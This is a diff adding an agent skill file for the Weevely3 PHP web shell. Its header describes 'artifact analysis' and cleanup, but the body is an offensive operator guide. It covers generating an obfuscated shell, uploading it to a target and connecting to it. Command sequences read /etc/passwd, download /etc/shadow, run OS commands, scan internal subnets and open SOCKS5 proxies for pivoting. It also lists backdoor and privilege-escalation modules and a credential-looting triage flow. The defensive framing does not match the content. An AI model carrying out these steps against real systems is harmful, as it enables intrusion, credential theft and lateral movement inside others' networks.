@@ -1,0 +1,85 @@
+---
+name: weevely3
+description: "Auth/lab ref: Weevely3 PHP web-shell artifact analysis; file ops, module inventory, pivot-risk review, containment and cleanup notes."
+license: MIT
+compatibility: "Python 3; Linux/macOS."
+metadata:
+  author: AeonDave
+  version: "1.0"
+---
+
+# Weevely3
+
+Stealth PHP webshell with 30+ post-exploitation modules.
+
+## Quick Start
+
+```bash
+git clone https://github.com/epinna/weevely3
+cd weevely3 && pip3 install -r requirements.txt
+
+# Generate obfuscated PHP shell
+python3 weevely.py generate MyPassword shell.php
+# Upload shell.php to target
+
+# Connect
+python3 weevely.py http://target.com/uploads/shell.php MyPassword
+```
+
+## Core Commands (in shell)
+
+| Command | Purpose |
+|---------|---------|
+| `:help` | List all modules |
+| `:file_read /etc/passwd` | Read file |
+| `:file_download /etc/shadow /tmp/shadow` | Download file |
+| `:file_upload /local/file /remote/path` | Upload file |
+| `:shell_sh "id"` | Run OS command |
+| `:net_scan 192.168.1.0/24 22,80,443` | Port scan |
+| `:net_proxy socks5` | Start SOCKS5 proxy |
+| `:audit_phpconf` | Audit PHP config |
+| `:bruteforce_sql` | SQL brute-force |
+
+## High-value Module Families
+
+- `:system_*` for host context and process visibility
+- `:file_*` for file enumeration, read/write, exfiltration
+- `:audit_*` for privilege-escalation and security posture checks
+- `:net_*` for internal scanning and proxy pivoting
+- `:backdoor_*` for reverse/direct shell pivots
+
+## Common Workflows
+
+**Full post-ex after upload:**
+```
+:shell_sh "id && uname -a"
+:file_read /etc/passwd
+:net_scan 10.10.10.0/24 22,80,443
+:net_proxy socks5 0.0.0.0 1080
+```
+
+**Pivot via SOCKS5:**
+```
+:net_proxy socks5 127.0.0.1 1080
+# Configure proxychains → proxychains nmap internal_host
+```
+
+## Post-Upload Triage Flow
+
+```text
+:system_info
+:shell_sh "id && uname -a && pwd"
+:audit_phpconf
+:file_ls .
+```
+
+Then choose one branch:
+- Credential/file branch (`:file_find`, `:file_read`, `:file_download`)
+- Network branch (`:net_ifconfig`, `:net_scan`, `:net_proxy`)
+- Priv-esc recon branch (`:audit_suidsgid`, `:audit_filesystem`)
+
+## Resources
+
+| File | When to load |
+|------|--------------|
+| `references/module-playbooks.md` | Practical module chains for triage, file loot, pivoting, and privilege-escalation reconnaissance |
